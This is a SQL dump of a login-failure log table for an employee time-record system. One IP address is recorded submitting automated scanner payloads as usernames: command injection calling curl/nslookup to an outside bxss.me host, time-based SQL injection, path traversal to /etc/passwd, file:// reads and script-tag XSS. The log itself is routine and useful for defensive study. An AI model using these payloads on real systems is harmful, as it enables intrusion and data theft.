INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('84', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('85', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('86', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('87', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('88', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: \"+\"A\".concat(70-3).concat(22*4).concat(117).concat(89).concat(104).concat(68)+(require\"socket\"\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('89', '', '2023-05-08 03:40:46', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('90', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: \'+\'A\'.concat(70-3).concat(22*4).concat(112).concat(72).concat(105).concat(83)+(require\'socket\'\nSocket.gethostby', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('91', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('92', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('93', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('94', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('95', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('96', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('97', '', '2023-05-08 03:40:47', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('98', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('99', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('100', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('101', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('102', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: check_dtr/.', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('103', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('104', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('105', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('106', '', '2023-05-08 03:40:48', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('107', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('108', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('109', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('110', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('111', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('112', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('113', '', '2023-05-08 03:40:49', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('114', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('115', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('116', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('117', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('118', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('119', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: \'\"()', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('120', '', '2023-05-08 03:40:50', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('121', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: RDFYjolf\'&&sleep(27*1000)*zarpuf&&\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('122', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('123', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: RDFYjolf\"&&sleep(27*1000)*ssbdqd&&\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('124', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: echo mosuoz$()\\ fvcnin\\nz^xyu||a #\' &echo mosuoz$()\\ fvcnin\\nz^xyu||a #|\" &echo mosuoz$()\\ fvcnin\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('125', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: RDFYjolf\'||sleep(27*1000)*tbthkl||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('126', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: &echo jyqxvk$()\\ acbjjm\\nz^xyu||a #\' &echo jyqxvk$()\\ acbjjm\\nz^xyu||a #|\" &echo jyqxvk$()\\ acbjjm\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('127', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('128', '', '2023-05-08 03:40:51', '', 'Invalid username/password. Tried with: RDFYjolf\"||sleep(27*1000)*owzijh||\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('129', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: |echo vrsujm$()\\ wenvxg\\nz^xyu||a #\' |echo vrsujm$()\\ wenvxg\\nz^xyu||a #|\" |echo vrsujm$()\\ wenvxg\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('130', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('131', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: (nslookup -q=cname hitrmwxjfwmffe0fb0.bxss.me||curl hitrmwxjfwmffe0fb0.bxss.me))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('132', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('133', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('134', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: $(nslookup -q=cname hitmiwvvdggec325fc.bxss.me||curl hitmiwvvdggec325fc.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('135', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('136', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('137', '', '2023-05-08 03:40:52', '', 'Invalid username/password. Tried with: &nslookup -q=cname hitwhfrzvuhwp29fb4.bxss.me&\'\\\"`0&nslookup -q=cname hitwhfrzvuhwp29fb4.bxss.me&`\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('138', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('139', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: &(nslookup -q=cname hitsruefaovlpdffb5.bxss.me||curl hitsruefaovlpdffb5.bxss.me)&\'\\\"`0&(nslookup -q=cname hitsr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('140', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('141', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: |(nslookup -q=cname hitciazmlpyvcf8a51.bxss.me||curl hitciazmlpyvcf8a51.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('142', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('143', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: `(nslookup -q=cname hittvcooaojah19776.bxss.me||curl hittvcooaojah19776.bxss.me)`', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('144', '', '2023-05-08 03:40:53', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('145', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: ;(nslookup -q=cname hitbodifzwfbmc8f97.bxss.me||curl hitbodifzwfbmc8f97.bxss.me)|(nslookup -q=cname hitbodifzwf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('146', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('147', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('148', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('149', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('150', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('151', '', '2023-05-08 03:40:54', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('152', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('153', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('154', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('155', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('156', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('157', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('158', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('159', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('160', '', '2023-05-08 03:40:55', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('161', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: file:///etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('162', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('163', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('164', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('165', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: ../RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('166', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('167', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: 1RAMHbsd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('168', '', '2023-05-08 03:40:56', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('169', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('170', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: -1 OR 2+816-816-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('171', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('172', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('173', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: -1 OR 2+237-237-1=0+0+0+1', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('174', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('175', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('176', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: -1\' OR 2+122-122-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('177', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('178', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('179', '', '2023-05-08 03:40:57', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('180', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: -1\' OR 2+525-525-1=0+0+0+1 or \'wINqlWfo\'=\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('181', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: xfs.bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('182', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: RDFYjolf\'\"()&%<zzz><ScRiPt >63fO(9933)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('183', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: -1\" OR 2+231-231-1=0+0+0+1 -- ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('184', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('185', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: \'\"()&%<zzz><ScRiPt >63fO(9813)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('186', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('187', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('188', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: RDFYjolf9431203', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('189', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('190', '', '2023-05-08 03:40:58', '', 'Invalid username/password. Tried with: \'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('191', '', '2023-05-08 03:40:59', '', 'Invalid username/password. Tried with: <!--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('192', '', '2023-05-08 03:40:59', '', 'Invalid username/password. Tried with: if(now()=sysdate(),sleep(15),0)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('193', '', '2023-05-08 03:40:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('194', '', '2023-05-08 03:40:59', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('195', '', '2023-05-08 03:41:00', '', 'Invalid username/password. Tried with: 0\'XOR(if(now()=sysdate(),sleep(15),0))XOR\'Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('196', '', '2023-05-08 03:41:01', '', 'Invalid username/password. Tried with: 0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('197', '', '2023-05-08 03:41:02', '', 'Invalid username/password. Tried with: (select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'\"+(select(0)from(select(sleep(15)))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('198', '', '2023-05-08 03:41:02', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('199', '', '2023-05-08 03:41:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('200', '', '2023-05-08 03:41:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('201', '', '2023-05-08 03:41:03', '', 'Invalid username/password. Tried with: response.write(9989429*9318760)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('202', '', '2023-05-08 03:41:03', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('203', '', '2023-05-08 03:41:03', '', 'Invalid username/password. Tried with: \'+response.write(9989429*9318760)+\'', '107.178.112.106');
